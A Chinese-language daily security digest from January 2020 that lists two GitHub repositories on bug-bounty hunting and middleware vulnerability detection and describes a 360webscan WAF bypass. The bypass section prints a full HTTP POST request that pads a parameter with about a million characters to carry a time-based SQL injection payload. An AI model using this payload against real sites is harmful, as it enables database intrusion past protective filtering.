---
title: 每日安全看点 2020-01-21
description: 汇总 2020 年 1 月 21 日安全动态：SRC 挖掘经验库、中间件漏洞检测合集、360webscan WAF 绕过新姿势。
category: ai-security
tags:
- 每日安全看点
- SRC
- 中间件漏洞
- WAF绕过
- 360webscan
- 2020年1月
date: 2020-01-21
updated: '2026-11-12'
---

## 概览

本期每日安全看点收录三项实用资源与技巧：面向 SRC 漏洞挖掘的经验总结仓库、中间件常见漏洞检测合集，以及针对 360webscan 的大长度 Payload 绕过姿势。

## 资源与工具

### SRC 挖掘经验库

- **项目地址**：<https://github.com/Wh0ale/SRC-experience>
- **说明**：汇总 SRC（安全应急响应中心）漏洞挖掘的实战技巧、常见漏洞类型分析、挖掘思路及工具链推荐，适合红队与白帽子系统性学习。

### 中间件漏洞检测合集

- **项目地址**：<https://github.com/mai-lang-chai/Middleware-Vulnerability-detection>
- **说明**：整理主流中间件（Tomcat、WebLogic、JBoss、Nginx、Apache 等）的历史高危漏洞检测脚本、PoC 与利用方式，便于资产排查与应急响应。

## 技术细节

### 360webscan WAF 绕过新姿势

**原理**：通过超长字符串（约 100 万个 `A`）填充 POST 参数，导致 WAF 正则匹配或长度校验逻辑失效/超时，从而绕过 360webscan 的 SQL 注入防护规则。

**验证 Payload**：

```http
POST /tz.php HTTP/1.1
Host: [0.0.0.0](0.0.0.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 1000026

id=UNIONAAA...AAA' or sleep(5)--+-a
```

> **注意**：`AAA...AAA` 代表约 1,000,000 个 `A` 字符，实测可绕过 360webscan 的默认拦截规则。

## 关联阅读

- [[daily-security-digest-20200122]] — 翌日看点：Project Zero 披露 CVE-2019-6250 修复绕过、恶意软件逆向教程、Fuzzing 30 年演进回顾
- [[daily-security-digest-20200210]] — 后续看点：ATT&CK 渗透手册、智能合约审计、ysoserial C3P0 利用链、疫情下远程办公安全专题
- [[daily-security-digest-20200212]] — 涵盖 Darkhotel APT 双 0day、Windows Defender 驱动分析、Chrome 漏洞分析、Blind SSRF 利用等
- [[daily-security-digest-20200220]] — 包含 GitHub 敏感信息采集、SQL Server SSRS RCE (CVE-2020-0618)、YzmCMS Getshell 等
- [[daily-security-digest-20200221]] — Tomcat AJP 协议文件读取 (CVE-2020-1938)、iOS 虚拟机 UTM、免杀工具评估
- [[daily-security-digest-20200311]] — SRC 漏洞挖掘技巧、自建 IoT 实验室指南、逆向与二进制利用书籍推荐
- [[daily-security-digest-20200312]] — wget CVE 分析、真实渗透测试案例、JSC/WebKit 架构资料、漏洞挖掘技巧系列

## 小结

本期看点以「资源库 + 实战绕过」为主，适合红队人员补充工具箱、拓展 WAF 绕过思路。建议结合 [[daily-security-digest-20200311]] 的 SRC 挖掘专题与 [[daily-security-digest-20200212]] 的 Blind SSRF 利用技巧，系统提升实战能力。最后，小伙伴们注意安全，保重身体~

## 来源

- [0th3rs安全团队-201911-202204_090](../sources/0th3rs安全团队-201911-202204_090.md)
